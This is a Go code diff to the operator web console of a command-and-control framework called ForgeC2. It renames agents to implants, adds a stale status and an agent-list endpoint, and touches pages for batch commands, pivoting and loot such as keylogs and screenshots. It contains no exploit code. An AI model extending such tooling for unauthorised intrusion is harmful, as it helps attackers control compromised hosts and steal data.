@@ -39,10 +39,10 @@ func (s *Server) handleDashboard(c *gin.Context) {
 	)
 
 	wg.Add(11)
-	go func() { defer wg.Done(); s.db.Model(&db.Agent{}).Count(&totalAgents) }()
+	go func() { defer wg.Done(); s.db.Model(&db.Implant{}).Count(&totalAgents) }()
 	go func() {
 		defer wg.Done()
-		s.db.Model(&db.Agent{}).Where("last_seen > ?", offlineCutoff).Count(&onlineAgents)
+		s.db.Model(&db.Implant{}).Where("last_seen > ?", offlineCutoff).Count(&onlineAgents)
 	}()
 	go func() {
 		defer wg.Done()
@@ -59,7 +59,7 @@ func (s *Server) handleDashboard(c *gin.Context) {
 	wg.Wait()
 
 	// Online agent list (recently active) - optimized with SELECT
-	var recentAgents []db.Agent
+	var recentAgents []db.Implant
 	s.db.Select("id", "hostname", "ip", "os", "arch", "last_seen").
 		Where("last_seen > ?", offlineCutoff).
 		Order("last_seen desc").Limit(10).Find(&recentAgents)
@@ -88,7 +88,6 @@ func (s *Server) handleDashboard(c *gin.Context) {
 		"TotalTasks":     totalTasks,
 		"RecentAgents":   recentAgents,
 	}
-	s.addUserToData(c, data)
 	for k, v := range stats {
 		data[k] = v
 	}
@@ -103,15 +102,18 @@ func (s *Server) handleAgents(c *gin.Context) {
 	pageStr := c.DefaultQuery("page", "1")
 	pageSizeStr := c.DefaultQuery("pageSize", "20")
 
-	query := s.db.Model(&db.Agent{})
+	query := s.db.Model(&db.Implant{})
 	if search != "" {
 		query = query.Where("hostname LIKE ? OR username LIKE ? OR ip LIKE ?", "%"+search+"%", "%"+search+"%", "%"+search+"%")
 	}
 	offlineCutoff := time.Now().Add(-s.offlineThreshold())
+	staleCutoff := time.Now().Add(-30 * time.Minute)
 	if statusFilter == "online" {
 		query = query.Where("last_seen > ?", offlineCutoff)
+	} else if statusFilter == "stale" {
+		query = query.Where("last_seen <= ? AND last_seen > ?", offlineCutoff, staleCutoff)
 	} else if statusFilter == "offline" {
-		query = query.Where("last_seen <= ?", offlineCutoff)
+		query = query.Where("last_seen <= ?", staleCutoff)
 	}
 	if osFilter != "" {
 		query = query.Where("LOWER(os) LIKE ?", "%"+osFilter+"%")
@@ -132,16 +134,11 @@ func (s *Server) handleAgents(c *gin.Context) {
 		pageSize = MaxPageSize
 	}
 
-	var agents []db.Agent
-	query.Select("id", "hostname", "username", "ip", "domain", "os", "arch", "integrity", "elevated", "last_seen", "created_at", "notes", "parent_id").
-		Order("last_seen desc").Offset((pageNum - 1) * pageSize).Limit(pageSize).Find(&agents)
+	var agents []db.Implant
+	query.Order("last_seen desc").Offset((pageNum - 1) * pageSize).Limit(pageSize).Find(&agents)
 
 	for i := range agents {
-		if time.Since(agents[i].LastSeen) > s.offlineThreshold() {
-			agents[i].Status = "offline"
-		} else {
-			agents[i].Status = "online"
-		}
+		agents[i].Status = s.agentStatus(agents[i]).Status
 	}
 
 	stats := s.getNavStats()
@@ -162,7 +159,6 @@ func (s *Server) handleAgents(c *gin.Context) {
 		"Total":      int(total),
 		"TotalPages": totalPages,
 	}
-	s.addUserToData(c, data)
 	for k, v := range stats {
 		data[k] = v
 	}
@@ -172,17 +168,13 @@ func (s *Server) handleAgents(c *gin.Context) {
 
 func (s *Server) handleAgentDetail(c *gin.Context) {
 	id := c.Param("id")
-	var agent db.Agent
+	var agent db.Implant
 	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
 		c.String(http.StatusNotFound, "Agent not found")
 		return
 	}
 
-	if time.Since(agent.LastSeen) > s.offlineThreshold() {
-		agent.Status = "offline"
-	} else {
-		agent.Status = "online"
-	}
+	agent.Status = s.agentStatus(agent).Status
 
 	var tasks []db.Task
 	s.db.Where("agent_id = ?", id).
@@ -267,11 +259,11 @@ func (s *Server) handleAgentDetail(c *gin.Context) {
 	agentAgeStr := formatDuration(agentAge)
 
 	// Fetch children for P2P chain
-	var children []db.Agent
+	var children []db.Implant
 	s.db.Where("parent_id = ?", id).Find(&children)
 
 	// Fetch unlinked agents (for linking dropdown) - optimized
-	var unlinkedAgents []db.Agent
+	var unlinkedAgents []db.Implant
 	s.db.Select("id", "hostname", "ip", "os").
 		Where("(parent_id = '' OR parent_id IS NULL) AND id != ?", id).Order("hostname asc").Find(&unlinkedAgents)
 
@@ -303,7 +295,6 @@ func (s *Server) handleAgentDetail(c *gin.Context) {
 		data["CSRFToken"] = csrf
 	}
 
-	s.addUserToData(c, data)
 	stats := s.getNavStats()
 	for k, v := range stats {
 		data[k] = v
@@ -389,7 +380,7 @@ func (s *Server) handleUpdateNote(c *gin.Context) {
 	if tags != "" {
 		updates["tags"] = tags
 	}
-	s.db.Model(&db.Agent{}).Where("id = ?", id).Updates(updates)
+	s.db.Model(&db.Implant{}).Where("id = ?", id).Updates(updates)
 	s.LogAuditRecord(c, "update_notes", "agent", id, fmt.Sprintf("notes/tags updated"), true, nil)
 	c.JSON(http.StatusOK, gin.H{"success": true})
 }
@@ -403,7 +394,7 @@ func (s *Server) handleDeleteAgent(c *gin.Context) {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to delete tasks"})
 		return
 	}
-	if err := tx.Delete(&db.Agent{}, "id = ?", id).Error; err != nil {
+	if err := tx.Delete(&db.Implant{}, "id = ?", id).Error; err != nil {
 		tx.Rollback()
 		slog.Error("Failed to delete agent", "agent_id", id, "err", err)
 		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to delete agent"})
@@ -455,7 +446,7 @@ func (s *Server) handleBatchCommand(c *gin.Context) {
 	failedCount := 0
 
 	for _, agentID := range req.AgentIDs {
-		var agent db.Agent
+		var agent db.Implant
 		if err := s.db.First(&agent, "id = ?", agentID).Error; err != nil {
 			failedCount++
 			continue
@@ -567,7 +558,7 @@ func (s *Server) handleTaskHistory(c *gin.Context) {
 		Distinct("type").Pluck("type", &taskTypes)
 
 	// Collect agents for filter dropdown
-	var agents []db.Agent
+	var agents []db.Implant
 	s.db.Select("id, hostname, ip").Order("hostname").Find(&agents)
 
 	// Count failed tasks for "retry all" button
@@ -596,21 +587,11 @@ func (s *Server) handleTaskHistory(c *gin.Context) {
 		"TaskTypes":      taskTypes,
 		"Agents":         agents,
 	}
-	s.addUserToData(c, data)
 	for k, v := range stats {
 		data[k] = v
 	}
 
-	var contentBuf bytes.Buffer
-	if err := s.tmpl.ExecuteTemplate(&contentBuf, "tasks_content", data); err != nil {
-		slog.Error("Failed to render content", "err", err)
-		c.String(http.StatusInternalServerError, "Template error")
-		return
-	}
-
-	data["Content"] = template.HTML(contentBuf.String())
-	c.Header("Content-Type", "text/html; charset=utf-8")
-	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
+	s.renderPage(c, "tasks_content", data)
 }
 
 // handleExportTasks exports tasks as CSV for reporting
@@ -671,9 +652,16 @@ func (s *Server) getNavStats() gin.H {
 	}
 
 	offlineCutoff := time.Now().Add(-s.offlineThreshold())
+	staleCutoff := time.Now().Add(-30 * time.Minute)
 
 	var online int64
-	s.db.Model(&db.Agent{}).Where("last_seen > ?", offlineCutoff).Count(&online)
+	s.db.Model(&db.Implant{}).Where("last_seen > ?", offlineCutoff).Count(&online)
+
+	var stale int64
+	s.db.Model(&db.Implant{}).Where("last_seen <= ? AND last_seen > ?", offlineCutoff, staleCutoff).Count(&stale)
+
+	var offlineAgents int64
+	s.db.Model(&db.Implant{}).Where("last_seen <= ?", staleCutoff).Count(&offlineAgents)
 
 	var listenerCount int64
 	s.db.Model(&db.Listener{}).Where("enabled = ?", true).Count(&listenerCount)
@@ -683,6 +671,8 @@ func (s *Server) getNavStats() gin.H {
 
 	navStatsCache = gin.H{
 		"OnlineCount":   online,
+		"StaleCount":    stale,
+		"OfflineCount":  offlineAgents,
 		"ListenerCount": listenerCount,
 		"PendingCount":  pendingTasks,
 	}
@@ -692,10 +682,11 @@ func (s *Server) getNavStats() gin.H {
 
 // renderPage is a helper method to render templates (optimization #8)
 func (s *Server) renderPage(c *gin.Context, tmplName string, data gin.H) {
+	s.addUserToData(c, data)
 	var buf bytes.Buffer
 	if err := s.tmpl.ExecuteTemplate(&buf, tmplName, data); err != nil {
 		slog.Error("Template render error", "template", tmplName, "err", err)
-		c.String(http.StatusInternalServerError, "Template error")
+		c.String(http.StatusInternalServerError, "Template error: " + err.Error())
 		return
 	}
 	data["Content"] = template.HTML(buf.String())
@@ -726,7 +717,7 @@ func (s *Server) addUserToData(c *gin.Context, data gin.H) {
 
 // handlePivoting shows SOCKS / proxy status and agents useful for pivoting
 func (s *Server) handlePivoting(c *gin.Context) {
-	var recentAgents []db.Agent
+	var recentAgents []db.Implant
 	s.db.Select("id", "hostname", "ip", "os", "arch", "last_seen").
 		Where("last_seen > ?", time.Now().Add(-30*time.Minute)).Limit(30).Find(&recentAgents)
 
@@ -758,20 +749,11 @@ func (s *Server) handleTopologyPage(c *gin.Context) {
 		"Title":     "ForgeC2 - Network Topology",
 		"ActiveNav": "topology",
 	}
-	s.addUserToData(c, data)
 	for k, v := range stats {
 		data[k] = v
 	}
 
-	var contentBuf bytes.Buffer
-	if err := s.tmpl.ExecuteTemplate(&contentBuf, "topology_content", data); err != nil {
-		slog.Error("topology render fail", "err", err)
-		c.String(http.StatusInternalServerError, "Template error")
-		return
-	}
-	data["Content"] = template.HTML(contentBuf.String())
-	c.Header("Content-Type", "text/html; charset=utf-8")
-	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
+	s.renderPage(c, "topology_content", data)
 }
 
 // handleTopologyData returns JSON nodes and edges for the topology graph
@@ -779,7 +761,7 @@ func (s *Server) handleTopologyData(c *gin.Context) {
 	var listeners []db.Listener
 	s.db.Where("enabled = ?", true).Find(&listeners)
 
-	var agents []db.Agent
+	var agents []db.Implant
 	s.db.Find(&agents)
 
 	onlineCutoff := time.Now().Add(-s.offlineThreshold())
@@ -851,7 +833,7 @@ func (s *Server) handleTopologyData(c *gin.Context) {
 // handleLootPage aggregates loot: screenshots, keylogs, downloaded files across all agents
 func (s *Server) handleLootPage(c *gin.Context) {
 	// Get all agents
-	var agents []db.Agent
+	var agents []db.Implant
 	s.db.Order("last_seen desc").Find(&agents)
 
 	dataDir := s.cfg.Server.DataDir
@@ -907,21 +889,11 @@ func (s *Server) handleLootPage(c *gin.Context) {
 		"KeylogTasks":   keylogTasks,
 		"DownloadTasks": downloadTasks,
 	}
-	s.addUserToData(c, data)
 	for k, v := range stats {
 		data[k] = v
 	}
 
-	var contentBuf bytes.Buffer
-	if err := s.tmpl.ExecuteTemplate(&contentBuf, "loot_content", data); err != nil {
-		slog.Error("Failed to render loot", "err", err)
-		c.String(http.StatusInternalServerError, "Template error")
-		return
-	}
-
-	data["Content"] = template.HTML(contentBuf.String())
-	c.Header("Content-Type", "text/html; charset=utf-8")
-	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
+	s.renderPage(c, "loot_content", data)
 }
 
 func (s *Server) handleGlobalSearch(c *gin.Context) {
@@ -939,7 +911,7 @@ func (s *Server) handleGlobalSearch(c *gin.Context) {
 
 	if query != "" {
 		// Search agents
-		var agents []db.Agent
+		var agents []db.Implant
 		s.db.Where("hostname LIKE ? OR username LIKE ? OR ip LIKE ? OR id LIKE ?",
 			"%"+query+"%", "%"+query+"%", "%"+query+"%", "%"+query+"%").Limit(20).Find(&agents)
 		for _, a := range agents {
@@ -1017,7 +989,7 @@ func (s *Server) handleLinkAgent(c *gin.Context) {
 		return
 	}
 
-	var parent, child db.Agent
+	var parent, child db.Implant
 	if err := s.db.Where("id = ?", parentID).First(&parent).Error; err != nil {
 		c.JSON(http.StatusNotFound, gin.H{"error": "parent agent not found"})
 		return
@@ -1042,7 +1014,7 @@ func (s *Server) handleLinkAgent(c *gin.Context) {
 func (s *Server) handleUnlinkAgent(c *gin.Context) {
 	childID := c.Param("id")
 
-	var child db.Agent
+	var child db.Implant
 	if err := s.db.Where("id = ?", childID).First(&child).Error; err != nil {
 		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
 		return
@@ -1059,9 +1031,33 @@ func (s *Server) handleUnlinkAgent(c *gin.Context) {
 	c.Redirect(http.StatusSeeOther, "/agents/"+childID)
 }
 
+// handleListAgents returns all agents as JSON for dropdowns
+func (s *Server) handleListAgents(c *gin.Context) {
+	var agents []db.Implant
+	s.db.Order("hostname asc").Find(&agents)
+	type agentBrief struct {
+		ID       string `json:"id"`
+		Hostname string `json:"hostname"`
+		IP       string `json:"ip"`
+		Status   string `json:"status"`
+		OS       string `json:"os"`
+	}
+	results := make([]agentBrief, 0, len(agents))
+	for _, a := range agents {
+		results = append(results, agentBrief{
+			ID:       a.ID,
+			Hostname: a.Hostname,
+			IP:       a.IP,
+			Status:   a.Status,
+			OS:       a.OS,
+		})
+	}
+	c.JSON(http.StatusOK, gin.H{"agents": results})
+}
+
 // handleListUnlinkedAgents returns agents without a parent for linking dropdown
 func (s *Server) handleListUnlinkedAgents(c *gin.Context) {
-	var agents []db.Agent
+	var agents []db.Implant
 	s.db.Where("parent_id = '' OR parent_id IS NULL").Order("hostname asc").Find(&agents)
 	c.JSON(http.StatusOK, agents)
 }
